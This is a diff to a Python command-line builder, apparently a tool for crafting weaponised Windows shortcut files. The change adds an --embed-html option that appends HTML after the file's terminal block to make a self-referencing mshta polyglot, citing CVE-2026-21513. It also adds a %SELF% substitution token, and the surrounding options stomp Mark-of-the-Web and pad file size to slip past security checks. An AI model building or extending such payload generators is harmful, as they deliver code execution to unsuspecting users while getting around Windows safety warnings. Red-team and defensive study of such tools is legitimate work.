@@ -200,6 +200,19 @@ def _cmd_build(args: argparse.Namespace) -> None:
         except OSError as exc:
             sys.exit(f"Error: cannot read append file: {exc}")
 
+    # Embed HTML (mshta polyglot convenience -- CVE-2026-21513)
+    if args.embed_html is not None:
+        html_path = Path(args.embed_html)
+        if not html_path.is_file():
+            sys.exit(f"Error: embed-html file not found: {args.embed_html}")
+        try:
+            cfg["append_data"] = html_path.read_bytes()
+        except OSError as exc:
+            sys.exit(f"Error: cannot read embed-html file: {exc}")
+        # Auto-set arguments to output basename for self-referencing
+        if not cfg.get("arguments"):
+            cfg["arguments"] = Path(args.output).name
+
     # MotW stomp
     if args.stomp_motw is not None:
         cfg["stomp_motw"] = args.stomp_motw
@@ -216,6 +229,10 @@ def _cmd_build(args: argparse.Namespace) -> None:
         target = cfg["target"]
         if isinstance(target, str):
             cfg["working_dir"] = _derive_working_dir(target)
+
+    # Replace %SELF% token in arguments with the output basename
+    if isinstance(cfg.get("arguments"), str) and "%SELF%" in cfg["arguments"]:
+        cfg["arguments"] = cfg["arguments"].replace("%SELF%", Path(args.output).name)
 
     # Reject reserved FileAttributes bits at the CLI boundary (spec 2.1.2).
     fa = cfg.get("file_attributes", 0x20)
@@ -376,11 +393,22 @@ def main(argv: list[str] | None = None) -> None:
         metavar="SIZE",
         help="Append null bytes to inflate file size (e.g. 100MB, 1GB)",
     )
-    bp.add_argument(
+    payload_group = bp.add_mutually_exclusive_group()
+    payload_group.add_argument(
         "--append",
         default=None,
         metavar="FILE",
         help="Append file content after terminal block (polyglot payload)",
+    )
+    payload_group.add_argument(
+        "--embed-html",
+        default=None,
+        metavar="FILE",
+        help=(
+            "Embed HTML after terminal block for mshta polyglot; "
+            "auto-sets arguments to output filename for self-referencing "
+            "(CVE-2026-21513)"
+        ),
     )
     bp.add_argument(
         "--stomp-motw",
